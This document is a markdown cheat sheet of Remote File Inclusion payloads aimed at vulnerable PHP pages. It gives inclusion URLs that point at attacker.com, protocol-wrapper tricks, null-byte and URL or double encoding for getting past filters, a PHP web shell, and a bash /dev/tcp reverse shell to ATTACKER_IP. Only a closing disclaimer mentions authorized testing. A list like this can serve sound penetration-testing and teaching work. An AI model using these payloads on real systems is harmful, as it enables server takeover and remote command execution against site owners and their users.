# Remote File Inclusion (RFI) Payloads

Below is a collection of RFI (Remote File Inclusion) payloads that can be used for testing and educational purposes. These payloads attempt to include remote files on a vulnerable system.

## Basic RFI Payloads

```
http://vulnerable-site.com/index.php?page=http://attacker.com/malicious.txt
http://vulnerable-site.com/index.php?page=\\attacker.com\share\malicious.txt
http://vulnerable-site.com/index.php?page=//attacker.com/malicious.txt
```

## Protocol Wrappers

```
http://vulnerable-site.com/index.php?page=ftp://attacker.com/malicious.txt
http://vulnerable-site.com/index.php?page=php://input [with POST data]
http://vulnerable-site.com/index.php?page=data://text/plain,<?php phpinfo();?>
```

## Null Byte Termination (for older PHP versions)

```
http://vulnerable-site.com/index.php?page=http://attacker.com/malicious.txt%00
http://vulnerable-site.com/index.php?page=http://attacker.com/malicious.txt%00.jpg
```

## Bypassing Filters

### Using URL Encoding
```
http://vulnerable-site.com/index.php?page=h%74%74p%3a%2f%2fattacker.com%2fmalicious.txt
```

### Using Double Encoding
```
http://vulnerable-site.com/index.php?page=%2568%2574%2574%2570%253a%252f%252fattacker.com%252fmalicious.txt
```

### Appending Query Strings
```
http://vulnerable-site.com/index.php?page=http://attacker.com/malicious.txt?
http://vulnerable-site.com/index.php?page=http://attacker.com/malicious.txt?param=value
```

## Common RFI Exploitation Files

### PHP Shell
```
http://attacker.com/shell.txt contents:
<?php system($_GET['cmd']); ?>
```

### Reverse Shell
```
http://attacker.com/revshell.txt contents:
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'"); ?>
```

## Prevention Bypass Techniques

### Using Alternative Protocols
```
http://vulnerable-site.com/index.php?page=expect://ls
http://vulnerable-site.com/index.php?page=ssh2.shell://attacker.com:22
```

### Using Data URIs
```
http://vulnerable-site.com/index.php?page=data:text/plain,<?php echo shell_exec($_GET['cmd']); ?>
```

## Important Notes

- These payloads are for educational and authorized testing purposes only
- RFI vulnerabilities can lead to complete system compromise
- Modern PHP configurations often disable remote file inclusion by default (allow_url_include=Off)
- Always test in controlled environments with proper authorization
- Many WAFs and security systems detect and block RFI attempts

